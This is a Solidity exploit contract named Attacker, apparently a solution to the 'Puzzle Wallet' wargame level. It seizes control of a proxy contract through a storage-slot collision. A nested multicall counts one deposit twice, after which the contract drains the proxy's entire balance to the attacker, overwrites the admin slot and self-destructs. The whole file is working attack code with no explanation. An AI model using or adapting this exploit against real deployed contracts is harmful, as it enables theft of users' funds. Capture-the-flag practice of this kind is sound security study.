// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;


interface IPuzzleProxy {
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function setMaxBalance(uint256) external;
    function multicall(bytes[] calldata) external payable;
    function balances(address) external returns (uint256);
}

contract Attacker {
    IPuzzleProxy proxyContract;
    address payable player;

    event StringFailure(string stringFailure);
    event BytesFailure(bytes bytesFailure);

    constructor(address puzzleContract) public {
        player = msg.sender;
        proxyContract = IPuzzleProxy(puzzleContract);
    }

    function attack() public payable {
        require(msg.value >= address(proxyContract).balance, "insufficient ether sent");
        proposeNewAdmin();
        addToWhitelist();
        multiCallNested();
        moveFunds();
        becomOwner();
        kill();
    }

    function proposeNewAdmin() internal {
        // pendingAdmin = this contract
        proxyContract.proposeNewAdmin(address(this));
    }

    function addToWhitelist() internal {
        // add this contract to whitelist
        proxyContract.addToWhitelist(address(this));
    }

    function multiCallNested() internal {
        bytes memory _deposit = abi.encodeWithSignature("deposit()");
        bytes[] memory _dataDeposit = new bytes[](1);
        _dataDeposit[0] = _deposit;
        bytes memory _multicallDeposit = abi.encodeWithSignature("multicall(bytes[])", _dataDeposit);

        bytes[] memory _doubleMulticall = new bytes[](2);
        _doubleMulticall[0] = _multicallDeposit;
        _doubleMulticall[1] = _deposit;
        try proxyContract.multicall{value: address(proxyContract).balance}(_doubleMulticall) {

        } catch Error(string memory err) {
            emit StringFailure(err);
        } catch (bytes memory err) {
            emit BytesFailure(err);
        }

    }

    function moveFunds() internal {
        // send funds to player
        bytes memory data = new bytes(0x0);
        try proxyContract.execute(player, proxyContract.balances(address(this)), data) {
            
        } catch Error(string memory err) {
            emit StringFailure(err);
        } catch (bytes memory err) {
            emit BytesFailure(err);
        }
    }

    function becomOwner() internal {
        // become owner
        try proxyContract.setMaxBalance(uint256(player)) {

        } catch Error(string memory err) {
            emit StringFailure(err);
        } catch (bytes memory err) {
            emit BytesFailure(err);
        }
    }

    function kill() internal {
        // destroy
        selfdestruct(player);
    }

}